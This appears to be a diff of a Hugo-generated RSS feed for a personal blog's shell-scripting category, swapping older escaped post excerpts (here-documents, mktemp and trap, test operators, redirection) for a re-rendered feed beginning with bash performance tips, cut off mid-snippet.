-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>basename &lt;span style="color:#e6db74">${&lt;/span>__file&lt;span style="color:#e6db74">}&lt;/span> .sh&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__root&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>cd &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>dirname &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>__dir&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> pwd&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#75715e"># &amp;lt;-- change this as it depends on your app&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arg1&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>1&lt;span style="color:#66d9ef">:-&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="use-shift-to-read-function-arguments">Use shift to read function arguments&lt;/h5>
-&lt;blockquote>
-&lt;p>This makes it easier to reorder arguments, if you change your mind later.&lt;/p></description></item><item><title>Common shell scripting tips</title><link>https://linzeyan.github.io/posts/2021/20210922-shellbian-cheng-zhi-chang-yong-ji-qiao/</link><pubDate>Wed, 22 Sep 2021 13:01:11 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20210922-shellbian-cheng-zhi-chang-yong-ji-qiao/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-chang-yong-ji-qiao.html" target="_blank" rel="noopener">Common shell scripting tips&lt;/a>&lt;/li>
-&lt;li>&lt;a href="https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-nei-jian-ming-ling.html" target="_blank" rel="noopener">Shell scripting built-in commands&lt;/a>&lt;/li>
-&lt;li>&lt;a href="https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-te-shu-fu-hao.html" target="_blank" rel="noopener">Shell scripting special symbols&lt;/a>&lt;/li>
-&lt;/ul></description></item><item><title>How to use a here documents to write data to a file in bash script</title><link>https://linzeyan.github.io/posts/2021/20210507-using-heredoc-rediection-in-bash-shell-script-to-write-to-file/</link><pubDate>Fri, 07 May 2021 11:37:35 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20210507-using-heredoc-rediection-in-bash-shell-script-to-write-to-file/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.cyberciti.biz/faq/using-heredoc-rediection-in-bash-shell-script-to-write-to-file/" target="_blank" rel="noopener">How to use a here documents to write data to a file in bash script&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h4 id="allow-here-documents-within-shell-scripts-to-be-indented-in-a-natural-fashion-using-eof-">allow here-documents within shell scripts to be indented in a natural fashion using &lt;code>EOF&amp;lt;&amp;lt;-&lt;/code>&lt;/h4>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>command &lt;span style="color:#e6db74">&amp;lt;&amp;lt;-EOF
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> msg1
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> msg2
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> $var on line
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="disabling-pathnameparametervariable-expansion-command-substitution-arithmetic-expansion-with-eof">Disabling pathname/parameter/variable expansion, command substitution, arithmetic expansion with &lt;code>'EOF'&lt;/code>&lt;/h4>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>OUT&lt;span style="color:#f92672">=&lt;/span>/tmp/output.txt
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;Starting my script...&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;Doing something...&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># No parameter and variable expansion, command substitution, arithmetic expansion, or pathname expansion is performed on word.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># If any part of word is quoted, the delimiter is the result of quote removal on word, and the lines in the here-document&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># are not expanded. So EOF is quoted as follows&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat &lt;span style="color:#e6db74">&amp;lt;&amp;lt;&amp;#39;EOF&amp;#39; &amp;gt;$OUT
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> Status of backup as on $(date)
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> Backing up files $HOME and /etc/
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;Starting backup using rsync...&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>How to Create Temporary Files in Bash: mktemp and trap</title><link>https://linzeyan.github.io/posts/2019/20191230-mktemp/</link><pubDate>Mon, 30 Dec 2019 14:31:45 +0800</pubDate><guid>https://linzeyan.github.io/posts/2019/20191230-mktemp/</guid><description>&lt;ul>
-&lt;li>&lt;a href="http://www.ruanyifeng.com/blog/2019/12/mktemp.html" target="_blank" rel="noopener">How to Create Temporary Files in Bash: mktemp and trap&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h4 id="mktemp-command">&lt;code>mktemp&lt;/code> command&lt;/h4>
-&lt;ul>
-&lt;li>The generated temp file name is random and readable/writable only by the user.&lt;/li>
-&lt;li>To ensure creation succeeds, append OR (&lt;code>||&lt;/code>) after &lt;code>mktemp&lt;/code> to exit on failure.&lt;/li>
-&lt;li>To delete temp files on script exit, use &lt;code>trap&lt;/code> to register cleanup.&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>trap &lt;span style="color:#e6db74">&amp;#39;rm -f &amp;#34;$TMPFILE&amp;#34;&amp;#39;&lt;/span> EXIT
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>TMPFILE&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>mktemp&lt;span style="color:#66d9ef">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> exit &lt;span style="color:#ae81ff">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;Our temp file is &lt;/span>$TMPFILE&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="mktemp-options">mktemp options&lt;/h5>
-&lt;ul>
-&lt;li>&lt;code>-d&lt;/code> creates a temporary directory.&lt;/li>
-&lt;li>&lt;code>-p&lt;/code> specifies the directory for temp files. Default is &lt;code>$TMPDIR&lt;/code>. If not set, &lt;code>/tmp&lt;/code> is used.&lt;/li>
-&lt;li>&lt;code>-t&lt;/code> specifies a filename template. The template must end with at least three consecutive &lt;code>X&lt;/code> characters for randomness; six &lt;code>X&lt;/code> are recommended. The default template is &lt;code>tmp.&lt;/code> followed by ten random characters.&lt;/li>
-&lt;/ul>
-&lt;h4 id="trap-usage">&lt;code>trap&lt;/code> usage&lt;/h4>
-&lt;p>The trap command handles system signals in Bash scripts.&lt;/p></description></item><item><title>Shell Script Study Notes</title><link>https://linzeyan.github.io/posts/2019/20190807-mylxsw-growing-up-shell/</link><pubDate>Wed, 07 Aug 2019 15:14:08 +0800</pubDate><guid>https://linzeyan.github.io/posts/2019/20190807-mylxsw-growing-up-shell/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://github.com/mylxsw/growing-up/blob/master/doc/Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md" target="_blank" rel="noopener">Shell Script Study Notes&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h3 id="arithmetic-operations">Arithmetic operations&lt;/h3>
-&lt;pre>&lt;code>val=`expr $a + $b`
-&lt;/code>&lt;/pre>
-&lt;h3 id="operators">Operators&lt;/h3>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>Symbol&lt;/th>
-&lt;th>Description&lt;/th>
-&lt;th>Example&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>!&lt;/td>
-&lt;td>NOT&lt;/td>
-&lt;td>[ ! false ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-o&lt;/td>
-&lt;td>OR&lt;/td>
-&lt;td>[ $a -lt 20 -o $b -gt 20 ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-a&lt;/td>
-&lt;td>AND&lt;/td>
-&lt;td>[ $a -lt 20 -a $b -gt 20 ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>=&lt;/td>
-&lt;td>equality check&lt;/td>
-&lt;td>[ $a = $b ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>!=&lt;/td>
-&lt;td>inequality check&lt;/td>
-&lt;td>[ $a != $b ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-z&lt;/td>
-&lt;td>string length is 0, returns true if 0&lt;/td>
-&lt;td>[ -z $a ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-n&lt;/td>
-&lt;td>string length is not 0, returns true if not 0&lt;/td>
-&lt;td>[ -n $a ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>str&lt;/td>
-&lt;td>check whether string is empty, true if not&lt;/td>
-&lt;td>[ $a ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-b&lt;/td>
-&lt;td>check whether file is a block device&lt;/td>
-&lt;td>[ -b $file ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-c&lt;/td>
-&lt;td>check whether file is a character device&lt;/td>
-&lt;td>..&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-d&lt;/td>
-&lt;td>check whether file is a directory&lt;/td>
-&lt;td>[ -d $file ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-f&lt;/td>
-&lt;td>check whether file is a regular file&lt;/td>
-&lt;td>[ -f $file ]&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-r&lt;/td>
-&lt;td>check whether file is readable&lt;/td>
-&lt;td>..&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-w&lt;/td>
-&lt;td>check whether file is writable&lt;/td>
-&lt;td>..&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-x&lt;/td>
-&lt;td>check whether file is executable&lt;/td>
-&lt;td>..&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-s&lt;/td>
-&lt;td>check whether file is empty&lt;/td>
-&lt;td>..&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>-e&lt;/td>
-&lt;td>check whether file exists&lt;/td>
-&lt;td>..&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="special-variables">Special variables&lt;/h3>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>Variable&lt;/th>
-&lt;th>Meaning&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>$0&lt;/td>
-&lt;td>file name of the current script&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>$n&lt;/td>
-&lt;td>arguments passed to a script or function; n is the position&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>$#&lt;/td>
-&lt;td>number of arguments passed to a script or function&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>$*&lt;/td>
-&lt;td>all arguments as a single word, e.g., &amp;ldquo;1 2 3&amp;rdquo;&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>$@&lt;/td>
-&lt;td>all arguments as separate words, e.g., &amp;ldquo;1&amp;rdquo; &amp;ldquo;2&amp;rdquo; &amp;ldquo;3&amp;rdquo;&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>$?&lt;/td>
-&lt;td>exit status of the last command or return value of a function&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>$$&lt;/td>
-&lt;td>current shell process ID; for scripts, the PID of the script process&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="posix-program-exit-statuses">POSIX program exit statuses&lt;/h3>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>Code&lt;/th>
-&lt;th>Meaning&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>0&lt;/td>
-&lt;td>command exited successfully&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&amp;gt; 0&lt;/td>
-&lt;td>failure during redirection or word expansion (~, variables, commands, arithmetic, and word splitting)&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>1 - 125&lt;/td>
-&lt;td>command exited unsuccessfully; specific meanings are command-defined&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>126&lt;/td>
-&lt;td>command found but file is not executable&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>127&lt;/td>
-&lt;td>command not found&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&amp;gt; 128&lt;/td>
-&lt;td>command died from a signal&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="inputoutput-redirection">Input/output redirection&lt;/h3>
-&lt;table>
-&lt;thead>
-&lt;tr>
-&lt;th>Command&lt;/th>
-&lt;th>Description&lt;/th>
-&lt;/tr>
-&lt;/thead>
-&lt;tbody>
-&lt;tr>
-&lt;td>command &amp;gt; file&lt;/td>
-&lt;td>redirect output to file&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>command &amp;gt; file&lt;/td>
-&lt;td>redirect output to file by appending&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>n &amp;gt; file&lt;/td>
-&lt;td>redirect file descriptor n to file&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>n &amp;raquo; file&lt;/td>
-&lt;td>redirect file descriptor n to file by appending&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>n &amp;gt;&amp;amp; m&lt;/td>
-&lt;td>merge output file m and n&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>n &amp;lt;&amp;amp; m&lt;/td>
-&lt;td>merge input file m and n&lt;/td>
-&lt;/tr>
-&lt;tr>
-&lt;td>&amp;laquo; tag&lt;/td>
-&lt;td>use content between start tag and end tag as input&lt;/td>
-&lt;/tr>
-&lt;/tbody>
-&lt;/table>
-&lt;h3 id="file-include">File include&lt;/h3>
-&lt;p>Use &lt;code>.&lt;/code> or &lt;code>source&lt;/code> to include files.&lt;/p></description></item><item><title>What does `&lt; &lt;(command args)` mean in the shell?</title><link>https://linzeyan.github.io/posts/2018/20181117-what-does-command-args-mean-in-the-shell/</link><pubDate>Sat, 17 Nov 2018 22:29:23 +0800</pubDate><guid>https://linzeyan.github.io/posts/2018/20181117-what-does-command-args-mean-in-the-shell/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://stackoverflow.com/questions/2443085/what-does-command-args-mean-in-the-shell" target="_blank" rel="noopener">What does &lt;code>&amp;lt; &amp;lt;(command args)&lt;/code> mean in the shell?&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> IFS&lt;span style="color:#f92672">=&lt;/span> read -r -d &lt;span style="color:#e6db74">$&amp;#39;\0&amp;#39;&lt;/span> file; &lt;span style="color:#66d9ef">do&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dosomethingwith &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$file&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#75715e"># do something with each file&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">done&lt;/span> &amp;lt; &amp;lt;&lt;span style="color:#f92672">(&lt;/span>find /bar -name *foo* -print0&lt;span style="color:#f92672">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;()&lt;/code> is called &lt;a href="http://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution" target="_blank" rel="noopener">&lt;strong>process substitution&lt;/strong>&lt;/a> in the manual, and is similar to a pipe but passes an argument of the form &lt;code>/dev/fd/63&lt;/code> instead of using stdin.&lt;/p>
-&lt;p>&lt;code>&amp;lt;&lt;/code> reads the input from a file named on command line.&lt;/p>
-&lt;p>Together, these two operators function exactly like a pipe, so it could be rewritten as&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SHELL on Ricky</title><link>https://linzeyan.github.io/categories/shell/</link><description>Recent content in SHELL on Ricky</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 25 Sep 2024 09:23:00 +0800</lastBuildDate><atom:link href="https://linzeyan.github.io/categories/shell/index.xml" rel="self" type="application/rss+xml"/><item><title>Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash</title><link>https://linzeyan.github.io/posts/2024/20240925-advanced-shell-scripting/</link><pubDate>Wed, 25 Sep 2024 09:23:00 +0800</pubDate><guid>https://linzeyan.github.io/posts/2024/20240925-advanced-shell-scripting/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://omid.dev/2024/06/19/advanced-shell-scripting-techniques-automating-complex-tasks-with-bash/" target="_blank" rel="noopener"&gt;Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="use-built-in-commands"&gt;Use Built-in Commands&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;Built-in commands execute faster because they don&amp;rsquo;t require loading an external process.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;h4 id="minimize-subshells"&gt;Minimize Subshells&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;Subshells can be expensive in terms of performance.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Inefficient&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;output&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;cat file.txt&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Efficient&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;output&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;&amp;lt;file.txt&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="use-arrays-for-bulk-data"&gt;Use Arrays for Bulk Data&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;When handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Inefficient&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;item1&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;apple&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;item2&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;banana&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;item3&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;cherry&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Efficient&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;items&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=(&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;apple&amp;#34;&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;banana&amp;#34;&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;cherry&amp;#34;&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;for&lt;/span&gt; item in &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;items&lt;/span&gt;[@]&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;; &lt;span style="color:#c678dd"&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$item&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="enable-noclobber"&gt;Enable Noclobber&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;To prevent accidental overwriting of files.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o noclobber
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="use-functions"&gt;Use Functions&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;Functions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;h4 id="efficient-file-operations"&gt;Efficient File Operations&lt;/h4&gt;
+&lt;div class="alert info"&gt;
+&lt;span&gt;&lt;i data-feather="info"&gt;&lt;/i&gt;&lt;/span&gt;
+&lt;span&gt;&lt;strong&gt;When performing file operations, use efficient techniques to minimize resource usage.&lt;/strong&gt;&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Inefficient&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;while&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;read&lt;/span&gt; -r line; &lt;span style="color:#c678dd"&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$line&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;done&lt;/span&gt; &amp;lt; file.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Efficient&lt;/span&gt;
